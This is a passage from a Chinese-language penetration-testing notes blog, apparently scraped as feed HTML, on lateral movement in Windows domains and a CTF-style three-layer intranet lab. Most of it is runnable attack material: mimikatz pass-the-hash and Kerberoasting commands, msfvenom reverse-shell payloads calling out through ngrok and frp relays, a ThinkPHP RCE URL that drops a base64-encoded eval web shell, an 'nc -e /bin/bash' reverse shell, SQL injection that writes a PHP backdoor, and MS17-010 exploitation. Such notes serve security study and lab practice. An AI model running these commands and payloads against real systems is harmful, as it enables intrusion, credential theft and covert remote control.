class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">mstsc.exe /console /v:192.168.3.21 /admin<br><br>POWERSHELL<br></code></pre></td></tr></table></figure><p>Linux:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">rdesktop</span> <span class="hljs-number">192.168.3.21:3389</span><br><br>SHELL<br></code></pre></td></tr></table></figure><p>RDP密文HASH链接</p><p>windows Server需要开启 Restricted Admin mode，在Windows 8.1和Windows Server 2012 R2中默认开启，同时如果Win 7 和Windows Server 2008 R2安装了2871997、2973351补丁也支持；开启命令：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">REG <span class="hljs-keyword">ADD</span><span class="language-bash"> “HKLM\System\CurrentControlSet\Control\Lsa” /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f</span><br><br>POWERSHELL<br></code></pre></td></tr></table></figure><p>开启后运行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">mstsc.exe /restrictedadmin<br>mimikatz.exe<br>privilege::debug<br>sekurlsa::pth /user:administrator /domain:god /ntlm:ccef208c6485269c20db2cad21734fe7 “/run:mstsc.exe /restrictedadmin”<br><br>POWERSHELL<br></code></pre></td></tr></table></figure><h3 id="18-域横向移动SPN服务-探针-请求-破解-重写"><a href="#18-域横向移动SPN服务-探针-请求-破解-重写" class="headerlink" title="18.域横向移动SPN服务-探针,请求,破解,重写"></a>18.域横向移动SPN服务-探针,请求,破解,重写</h3><p><a href="https://www.cnblogs.com/backlion/p/8082623.html">https://www.cnblogs.com/backlion/p/8082623.html</a></p><p>黑客可以使用有效的域用户的身份验证票证（TGT）去请求运行在服务器上的一个或多个目标服务的服务票证。DC在活动目录中查找SPN，并使用与SPN关联的服务帐户加密票证，以便服务能够验证用户是否可以访问。请求的Kerberos服务票证的加密类型是RC4_HMAC_MD5，这意味着服务帐户的NTLM密码哈希用于加密服务票证。黑客将收到的TGS票据离线进行破解，即可得到目标服务帐号的HASH，这个称之为Kerberoast攻击。如果我们有一个为域用户帐户注册的任意SPN，那么该用户帐户的明文密码的NTLM哈希值就将用于创建服务票证。这就是Kerberoasting攻击的关键。</p><p>探针</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs 1c">setspn -q */*<br>setspn -q */* <span class="hljs-string">| findstr &quot;</span>MSSQL<span class="hljs-string">&quot;</span><br><br>POWERSHELL<br></code></pre></td></tr></table></figure><p>请求</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">Add</span>-<span class="hljs-keyword">Type</span> -AssemblyName <span class="hljs-keyword">System</span>.IdentityModel<br><br><span class="hljs-built_in">New</span>-<span class="hljs-keyword">Object</span> <span class="hljs-keyword">System</span>.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;xxxx&quot;<br><br>mimikatz.exe &quot;kerberos::ask /target:xxxx&quot;<br><br>POWERSHELL<br></code></pre></td></tr></table></figure><p>导出</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">mimikatz<span class="hljs-selector-class">.exe</span> <span class="hljs-string">&quot;kerberos::list /export&quot;</span><br><br>POWERSHELL<br></code></pre></td></tr></table></figure><p>破解</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python tgsrepcrack<span class="hljs-selector-class">.py</span> passwd<span class="hljs-selector-class">.txt</span> xxxx<span class="hljs-selector-class">.kirbi</span><br><br>python3 .\tgsrepcrack<span class="hljs-selector-class">.py</span> .\password<span class="hljs-selector-class">.txt</span> .\<span class="hljs-number">1</span>-<span class="hljs-number">40</span>a00000-jerry@MSSQLSvc~Srv-DB-<span class="hljs-number">0</span>day.<span class="hljs-number">0</span>day.org~<span class="hljs-number">1433</span>-<span class="hljs-number">0</span>DAY<span class="hljs-selector-class">.ORG</span><span class="hljs-selector-class">.kirbi</span><br><br>POWERSHELL<br></code></pre></td></tr></table></figure><p>重写</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> kerberoast.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">p</span> Password123 -r xxxx.kirbi -<span class="hljs-keyword">w</span> PENTESTLAB.kirbi -<span class="hljs-keyword">u</span> <span class="hljs-number">500</span><br><br><span class="hljs-keyword">python</span> kerberoast.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">p</span> Password123 -r xxxx.kirbi -<span class="hljs-keyword">w</span> PENTESTLAB.kirbi -g <span class="hljs-number">512</span><br><br>mimikatz.<span class="hljs-keyword">exe</span> kerberos::ptt xxxx.kirbi # 将生成的票据注入内存<br><br>POWERSHELL<br></code></pre></td></tr></table></figure><h3 id="19-域横向移动测试流程一把梭哈-CobaltStrike初体验"><a href="#19-域横向移动测试流程一把梭哈-CobaltStrike初体验" class="headerlink" title="19.域横向移动测试流程一把梭哈-CobaltStrike初体验"></a>19.域横向移动测试流程一把梭哈-CobaltStrike初体验</h3><p>参考：【腾讯文档】第五十二天：Cobalt Strike使用指南</p><p><a href="https://docs.qq.com/doc/DZlVaY3dzWlpRZlh3">https://docs.qq.com/doc/DZlVaY3dzWlpRZlh3</a></p><p>大概流程：</p><p>启动-配置-监听-执行-上线-提权-信息收集(网络,凭证,定位等)-渗透</p><p>1.关于启动及配置讲解</p><p>2.关于提权及插件加载</p><p>3.关于信息收集命令讲解</p><p>4.关于视图自动化功能讲解</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs stata">iew<br><br><span class="hljs-keyword">net</span> computer<br><br><span class="hljs-keyword">net</span> dclist <br><br><span class="hljs-keyword">shell</span> <span class="hljs-keyword">net</span> user /domain<br><br>POWERSHELL<br></code></pre></td></tr></table></figure><p><a href="https://xiaojun88.github.io/2022/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/1633082373154-ffa7b109-6ace-41f5-a049-838bb9ff396a.png"><img src="D:\blog2\source_posts\内网渗透笔记.assets\1633082373154-ffa7b109-6ace-41f5-a049-838bb9ff396a.png" alt="image.png"></a></p><p>image.png</p><p><a href="https://xiaojun88.github.io/2022/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/1633082376650-a7662dfd-7a4c-44a6-9365-2d94a0fd8aca.png"><img src="D:\blog2\source_posts\内网渗透笔记.assets\1633082376650-a7662dfd-7a4c-44a6-9365-2d94a0fd8aca.png" alt="image.png"></a></p><p>image.png</p><h3 id="20-内网穿透-Ngrok-测试演示-两个内网通讯上线"><a href="#20-内网穿透-Ngrok-测试演示-两个内网通讯上线" class="headerlink" title="20.内网穿透 Ngrok 测试演示-两个内网通讯上线"></a>20.内网穿透 Ngrok 测试演示-两个内网通讯上线</h3><p>实验环境：两个不同的内网(有网络)实现穿透控制</p><p>1.注册-购买-填写-确认</p><p><a href="http://www.ngrok.cc/">http://www.ngrok.cc/</a></p><p><a href="https://www.natfrp.com/">https://www.natfrp.com/</a></p><p>协议：http 本地端口：192.168.76.132:4444</p><p>2.测试：内网 1 执行后门-免费主机处理-内网 2 监听-内网 2 接受器</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs routeros">./sunny clientid aa0676878c162ffc<br>msfvenom -p windows/meterpreter/reverse_http <span class="hljs-attribute">lhost</span>=xiaodisec.free.idcfengye.com <span class="hljs-attribute">lport</span>=80 -f exe -o test.exe<br>use exploit/multi/handler<br><span class="hljs-built_in">set</span> payload windows/meterpreter/reverse_http<br><span class="hljs-built_in">set</span> lhost 192.168.76.132<br><span class="hljs-built_in">set</span> lport 4444<br>exploit<br><br>SHELL<br></code></pre></td></tr></table></figure><h3 id="21-内网穿透-Frp-自建跳板测试-两个内网通讯上线"><a href="#21-内网穿透-Frp-自建跳板测试-两个内网通讯上线" class="headerlink" title="21.内网穿透 Frp 自建跳板测试-两个内网通讯上线"></a>21.内网穿透 Frp 自建跳板测试-两个内网通讯上线</h3><p>自行搭建，方便修改，成本低，使用多样化，适合高富帅及隐私哥哥们</p><p>1.服务端-下载-解压-修改-启动（阿里云主机记得修改安全组配置出入口）</p><p>服务器修改配置文件 frps.ini：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs abnf">[common]<br>bind_port <span class="hljs-operator">=</span> <span class="hljs-number">6677</span><br><br>SHELL<br></code></pre></td></tr></table></figure><p>启动服务端：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">./frps -c ./frps.ini<br><br>SHELL<br></code></pre></td></tr></table></figure><p>2.控制端-下载-解压-修改-启动</p><p>控制端修改配置文件 frpc.ini：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs makefile">[common]<br>server_addr = 你的云主机 ip<br>server_port = 6677 <span class="hljs-comment">#frpc 工作端口，必须和上面 frps 保持一致</span><br>[msf]<br>type = tcp<br>local_ip = 127.0.0.1<br>local_port = 5555 <span class="hljs-comment">#转发给本机的 5555</span><br>remote_port = 6000 <span class="hljs-comment">#服务端用 6000 端口转发给本机</span><br><br>SHELL<br></code></pre></td></tr></table></figure><p>启动客户端：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">./frpc -c ./frpc.ini<br><br>SHELL<br></code></pre></td></tr></table></figure><p>生成后门</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p windows/meterpreter/reverse_tcp <span class="hljs-attribute">lhost</span>=101.37.160.211 <span class="hljs-attribute">lport</span>=6000 -f exe -o frp.exe<br>use exploit/multi/handler<br><span class="hljs-built_in">set</span> payload windows/meterpreter/reverse_tcp<br><span class="hljs-built_in">set</span> LHOST 127.0.0.1<br><span class="hljs-built_in">set</span> LPORT 5555<br>exploit<br><br>SHELL<br></code></pre></td></tr></table></figure><p>3.靶机运行 frp 即可</p><h3 id="22-CFS-三层内网漫游安全测试演练-某-CTF-线下-2019"><a href="#22-CFS-三层内网漫游安全测试演练-某-CTF-线下-2019" class="headerlink" title="22.CFS 三层内网漫游安全测试演练-某 CTF 线下 2019"></a>22.CFS 三层内网漫游安全测试演练-某 CTF 线下 2019</h3><p>来源 2019 某 CTF 线下赛真题内网结合 WEB 攻防题库，涉及 WEB 攻击，内网代理路由等技术，每台服务器存在一个 Flag，获取每一个 Flag 对应一个积分，获取三个 Flag 结尾。</p><p>本地测试基础环境</p><table><thead><tr><th>名称</th><th>网卡1</th><th>网卡2</th></tr></thead><tbody><tr><td>kali</td><td>192.168.229.143</td><td></td></tr><tr><td>Target1</td><td>192.168.1.128</td><td>192.168.22.128</td></tr><tr><td>Target2</td><td></td><td></td></tr></tbody></table><p>Target1：192.168.1.128</p><p>探针目标-利用 WEB 漏洞(TP5_RCE)-获取 webshell 权限-获取 Flag-Target2</p><p>0.Getshell</p><p>方法一 ：<a href="https://github.com/Lotus6/ThinkphpGUI/releases/tag/1.2">ThinkPHP getshell工具</a></p><p><a href="https://xiaojun88.github.io/2022/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/1634029248272-10cfa245-2cde-465d-82c1-f46cca9e61c7.png"><img src="D:\blog2\source_posts\内网渗透笔记.assets\1634029248272-10cfa245-2cde-465d-82c1-f46cca9e61c7.png" alt="image.png"></a></p><p>image.png</p><p>方法二：手动Getshell</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php">编码前：<br><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;cmd&quot;</span>]);<span class="hljs-meta">?&gt;</span><br>编码后：<br>PD9waHAgQGV2YWwoJF9QT1NUWyJjbWQiXSk7Pz4=<br>POC:<br>http:<span class="hljs-comment">//192.168.1.128/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=echo &quot;PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4=&quot;|base64 -d &gt; cmd.php</span><br><br>SHELL<br></code></pre></td></tr></table></figure><p>方法三：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://192.168.1.128/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars</span>[<span class="hljs-string">0</span>]=system&amp;vars[1][]=nc 192.168.229.143 6666 -e /bin/bash <br><br>KALI：nc -lnvp 6666<br>目标：nc 192.168.229.143 6666 -e /bin/bash<br><br>python -c <span class="hljs-emphasis">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><br>SHELL<br></code></pre></td></tr></table></figure><p>1.生成后门：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p linux/x64/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=192.168.229.143 <span class="hljs-attribute">LPORT</span>=1111 -f elf &gt;t1.elf<br><br>SHELL<br></code></pre></td></tr></table></figure><p>2.接受反弹：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/multi/handler<br><span class="hljs-built_in">set</span> payload linux/x64/meterpreter/reverse_tcp<br><span class="hljs-built_in">set</span> LHOST 192.168.229.143<br><span class="hljs-built_in">set</span> LPORT 1111<br>exploit<br><br>SHELL<br></code></pre></td></tr></table></figure><p>3.信息收集及配置访问</p><p>获取网络接口：run get_local_subnets</p><p>查看路由地址：run autoroute -p</p><p>添加路由地址：run autoroute -s 192.168.22.0&#x2F;24</p><p>开启本地代理：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">background<br><br>use auxiliary/server/socks_proxy <br><br><span class="hljs-comment">#socks5在代理sqlmap是有问题</span><br><br><span class="hljs-built_in">set</span> <span class="hljs-built_in">version</span> <span class="hljs-number">4</span><span class="hljs-keyword">a</span><br><span class="hljs-built_in">set</span> srvport <span class="hljs-number">2222</span><br>exploit<br><br>SHELL<br></code></pre></td></tr></table></figure><p>4.利用本地代理接口访问测试</p><p>设置浏览器代理进行访问测试</p><p>Linux：</p><p>安装 proxychains</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/rofl0r/proxychains-ng.git<br><span class="hljs-built_in">cd</span> proxychains-ng/<br>./configure --prefix=/usr --sysconfdir=/etc<br>make &amp;&amp; make install &amp;&amp; make install-config<br>vim /etc/proxychains.conf<br><br>SHELL<br></code></pre></td></tr></table></figure><p>配置 proxychains 后调用工具探针 Target2</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">vim</span> /etc/proxychains.conf<br><span class="hljs-attribute">socks4</span> <span class="hljs-number">127.0.0.1</span> <span class="hljs-number">2222</span><br><span class="hljs-attribute">proxychains</span> nmap -Pn -sT <span class="hljs-number">192.168.22.1</span>/<span class="hljs-number">24</span><br><br><span class="hljs-attribute">SHELL</span><br></code></pre></td></tr></table></figure><p>如果使用的是socks4a的话，socks4a不支持icmp协议，所以要使用不进行ping命令的-Pn<br>-Pn：扫描主机检测其是否受到数据包过滤软件或防火墙的保护。<br>-sT：扫描 TCP 数据包已建立的连接 connect</p><p>Windows：</p><p>利用代理工具 Proxifier 或 <a href="https://www.sockscap64.com/sockscap-64-free-download-zh-hans/">SocksCap64</a> 载入代理进行进程访问测试</p><p>Target2：</p><p>探针目标-利用 WEB 漏洞(SQL 注入)-后台获取 webshell 权限-获取 Flag-Target3</p><p>0.主机扫描</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">use</span> auxiliary/scanner/portscan/tcp<br><span class="hljs-keyword">set</span> RHOSTS 192.168.22.0/24<br><span class="hljs-keyword">run</span><br><br># Windows可以用arp扫描<br><br><span class="hljs-keyword">use</span> <span class="hljs-keyword">post</span>/windows/gather/arp_scanner<br><br><span class="hljs-keyword">SHELL</span><br></code></pre></td></tr></table></figure><p>sql 注入</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"># 确定数据库<br><br>http://<span class="hljs-number">192.168</span><span class="hljs-number">.22</span><span class="hljs-number">.129</span>/<span class="hljs-keyword">index</span>.php?r=vul&amp;keyword=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1)--+</span><br><span class="hljs-string"></span><br><span class="hljs-string"># 读表名</span><br><span class="hljs-string"></span><br><span class="hljs-string">http://192.168.22.129/index.php?r=vul&amp;keyword=1&#x27;</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,substr((<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;bagecms&#x27;</span>),<span class="hljs-number">1</span>,<span class="hljs-number">32</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br><br>http://<span class="hljs-number">192.168</span><span class="hljs-number">.22</span><span class="hljs-number">.129</span>/<span class="hljs-keyword">index</span>.php?r=vul&amp;keyword=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;</span>bagecms<span class="hljs-string">&#x27; limit 0,1),0x7e),1)--+</span><br><span class="hljs-string"></span><br><span class="hljs-string"># 读取字段</span><br><span class="hljs-string"></span><br><span class="hljs-string">http://192.168.22.129/index.php?r=vul&amp;keyword=1&#x27;</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,substr((<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;bagecms&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;bage_admin&#x27;</span>),<span class="hljs-number">1</span>,<span class="hljs-number">32</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br><br># 确定字段值：<br><br>http://<span class="hljs-number">192.168</span><span class="hljs-number">.22</span><span class="hljs-number">.129</span>/<span class="hljs-keyword">index</span>.php?r=vul&amp;keyword=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and updatexml(1,concat(0x7e,substr((select concat(username,0x7e,password) from bagecms.bage_admin),1,31),0x7e),1)--+</span><br><span class="hljs-string"></span><br><span class="hljs-string"># 写入shell</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-number">1</span>  <span class="hljs-keyword">INTO</span> OUTFILE <span class="hljs-string">&#x27;/www/wwwroot/r6.php&#x27;</span> LINES TERMINATED <span class="hljs-keyword">BY</span> <span class="hljs-string">&#x27;&lt;?php eval($_GET[8909]);?&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">SQL</span><br></code></pre></td></tr></table></figure><p>得到后台账号密码为admin&#x2F;123qwe</p><p>添加后门</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">http://<span class="hljs-number">192.168</span><span class="hljs-number">.22</span><span class="hljs-number">.129</span>/<span class="hljs-keyword">index</span>.php?r=admini/<span class="hljs-keyword">default</span>/<span class="hljs-keyword">index</span>#<span class="hljs-number">4</span>_0<br><br><span class="hljs-keyword">SQL</span><br></code></pre></td></tr></table></figure><p>1.生成正向后门：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p linux/x64/meterpreter/bind_tcp LPORT=3333 -f elf &gt; t2.elf<br><br>SHELL<br></code></pre></td></tr></table></figure><p>2.访问接受：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/multi/handler<br><span class="hljs-built_in">set</span> payload linux/x64/meterpreter/bind_tcp <span class="hljs-built_in">set</span> rhost 192.168.22.129<br><span class="hljs-built_in">set</span> LPORT 3333<br>exploit<br><br>SHELL<br></code></pre></td></tr></table></figure><p>3.信息收集及配置访问</p><p>获取网络接口：run get_local_subnets</p><p>查看路由地址：run autoroute -p</p><p>添加路由地址：run autoroute -s 192.168.33.0&#x2F;24</p><p>Target3：</p><p>探针目标-端口及漏洞扫描-利用MS17010获取系统权限-获取Flag</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs stata">Proxychains4 nmap -Pn -<span class="hljs-keyword">sT</span> 192.168.33.33<br><br># 探测操作系统<br><br><span class="hljs-keyword">use</span> auxiliary/scanner/smb/smb_version<br><span class="hljs-keyword">set</span> RHOSTS 192.168.33.33<br><br><span class="hljs-keyword">use</span> exploit/windows/smb/ms17_010_psexec<br><span class="hljs-keyword">set</span> payload windows/meterpreter/bind_tcp<br><span class="hljs-keyword">set</span> RHOSTS 192.168.33.33<br>exploit<br><span class="hljs-keyword">shell</span><br><span class="hljs-keyword">cd</span> /<br><span class="hljs-keyword">dir</span> /S flag.txt /B<br><span class="hljs-keyword">type</span> flag.txt<br><br><span class="hljs-keyword">SHELL</span><br></code></pre></td></tr></table></figure><h3 id="23-Frp建立-socks-代理"><a href="#23-Frp建立-socks-代理" class="headerlink" title="23.Frp建立 socks 代理"></a>23.Frp建立 socks 代理</h3><p>场景：内网主机可出网，想把内网主机作为跳板机使用</p><p>上面的场景只是利用 frp 访问了内网指定机器的指定端口，我们还可以利用 frp 将内网主机作为跳板机使用。</p><p>这次我们用上 frp 的 web 控制面板以及访问密码等功能，让我们建立的连接更加安全、方便。</p><p>在 VPS 上开启服务端，服务端配置文件如下：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs makefile">[common]<br>bind_port = 4444<br><br><span class="hljs-comment"># 客户端认证 token</span><br><br>token = 123456<br><br><span class="hljs-comment"># 设置 frps 仪表盘端口、账号和密码，实战中用处貌似不大，但如果设置一定要设置强密码</span><br><br>dashboard_port = 8000<br>dashboard_user = admin<br>dashboard_pwd = password<br><br>PLAIN<br></code></pre></td></tr></table></figure><p>配置好文件后，启动服务端</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs llvm">frps -<span class="hljs-keyword">c</span> frps.ini<br><br>PLAIN<br></code></pre></td></tr></table></figure><p>配置客户端文件</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs makefile">[common]<br><br>server_addr = vps_ip<br><br>server_port = 444<br><br>\<span class="hljs-comment"># 客户端认证 token，需要和服务端 token 保持一致</span><br><br>token = 123456<br><br>\<span class="hljs-comment"># 启用加密，防止流量被拦截</span><br><br>use_encryption = true<br><br>\<span class="hljs-comment"># 启用压缩，提升流量转发速度</span><br><br>use_compression = true<br><br>[socks5]<br><br>type = tcp<br><br>\<span class="hljs-comment"># 连接 vps 的端口</span><br><br>remote_port = 1080<br><br>plugin = socks5<br><br>PLAIN<br></code></pre></td></tr></table></figure><p>开启客户端</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">frpc -<span class="hljs-keyword">c</span> frpc.ini<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>vlunstack靶场(一)</title>
